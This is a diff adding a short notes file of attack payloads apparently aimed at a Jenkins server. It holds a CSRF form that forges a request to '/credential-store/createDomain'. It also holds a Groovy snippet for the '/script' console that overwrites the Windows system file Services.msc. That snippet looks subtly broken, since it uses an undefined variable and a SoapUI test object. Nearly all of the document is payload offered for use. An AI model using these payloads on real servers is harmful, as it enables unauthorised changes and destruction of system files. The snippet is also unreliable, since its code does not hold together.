@@ -1,0 +1,37 @@
+#CSRF
+
+--------
+
+#Payload:
+
+<form method="POST" name="form0"
+action="http://www.example.com:8090/credential-store/createDomain">
+
+<input type="hidden" name="_.name" value="xyz"/>
+<input type="hidden" name="description" value="abc"/>
+<input type="hidden" name="json" value="{'name': 'xyz', 'description': 'abc'}"/>
+<input type="hidden" name="Submit" value="OK"/>
+</form>
+
+
+Command Execution (/script)
+-------------------------------------
+ArrayList pids = null
+PrintWriter writer = null
+
+File f = new File("C:/Windows/System32/Services.msc")
+
+if (f.length() > 0){
+   pids = new ArrayList()
+   f.eachLine { line -> pids.add(line) }
+   println("Item to be removed: " + pids.get(0))
+   testRunner.testCase.setPropertyValue( "personId", pid )
+   pids.remove(0)
+   println pids
+   writer = new PrintWriter(f)
+   pids.each { id -> writer.println(id) }
+   writer.close()
+}
+else{
+   println "Null"
+    }
